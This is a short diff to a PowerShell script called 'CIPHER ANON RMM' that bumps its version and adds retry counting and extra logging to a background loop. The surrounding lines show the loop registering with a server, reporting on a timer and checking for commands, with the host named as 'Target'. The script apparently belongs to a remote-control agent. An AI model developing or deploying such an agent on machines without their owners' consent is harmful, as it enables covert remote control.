@@ -1,5 +1,5 @@
 # ============================================================
-# CIPHER ANON RMM v3.5 — FULLY WORKING WITH RETRY LOGIC
+# CIPHER ANON RMM v3.6 — FULLY WORKING WITH RETRY LOGIC
 # ============================================================
 
 # ---- CONFIGURATION ----
@@ -28,7 +28,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "CIPHER ANON RMM v3.5"
+Write-Log "CIPHER ANON RMM v3.6"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms (15s)"
 Write-Log "============================================"
@@ -265,9 +265,10 @@ $jobScript = {
         return @{ success = $success; result = $result }
     }
 
-    Write-Log "Background loop started (ID: $clientId)"
+    Write-Log "Background loop started (ID: $clientId) - BASE_URL: $BASE_URL"
 
     $firstRun = $true
+    $retryCount = 0
 
     while ($true) {
         try {
@@ -300,9 +301,11 @@ $jobScript = {
                 if ($firstRun) {
                     Write-Log "Initial registration successful"
                     $firstRun = $false
+                    $retryCount = 0
                 }
             } catch {
-                Write-Log "Report failed: $_"
+                $retryCount++
+                Write-Log "Report failed (attempt $retryCount): $_"
             }
 
             # Check for commands
